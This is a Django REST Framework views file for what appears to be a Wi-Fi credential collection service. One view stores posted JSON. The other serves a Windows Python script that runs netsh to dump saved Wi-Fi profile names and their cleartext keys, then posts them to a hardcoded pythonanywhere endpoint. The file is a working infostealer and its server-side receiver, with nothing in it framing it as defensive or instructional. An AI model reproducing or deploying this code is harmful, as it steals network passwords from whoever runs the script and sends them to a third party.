from django.shortcuts import render
from rest_framework.generics import CreateAPIView,ListAPIView
from json_store.models import WifiJson
from json_store.serializers import WifiJsonSerializer
from django.http import HttpResponse
from rest_framework.response import Response


class WIFICreateAPIView(CreateAPIView):
    queryset = WifiJson.objects.all()
    serializer_class = WifiJsonSerializer
    
    def create(self, request, *args, **kwargs):
        obj_list=[]
        for key,value in request.data.items():
            if key:
                obj=WifiJson()
                obj.name = key
                obj.data = value
                obj_list.append(obj)
        WifiJson.objects.bulk_create(obj_list)
        return HttpResponse("Hi")

class PyWifiScript(ListAPIView):
    def list(self, request, *args, **kwargs):
        a='''
import subprocess
import re
import requests
import json

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr
    except Exception as e:
        ...
command_to_execute = "netsh wlan show profiles"
result = execute_command(command_to_execute)
pattern = r":\s*(.+)"

matches = re.findall(pattern, result)
dict = {{}}
for index, match in enumerate(matches, start=1):
    res = execute_command(f'netsh wlan show profile name="{match}" key=clear')
    if res:
        dict[f"{{index}}{{match}}"] = res

url = "https://keedakandi.pythonanywhere.com/api/json-store/wifi-post"
response = requests.post(url, json=dict, timeout=20)
if response.status_code == 200:
    print()
else:
    print()

'''
        return Response({"sc":a})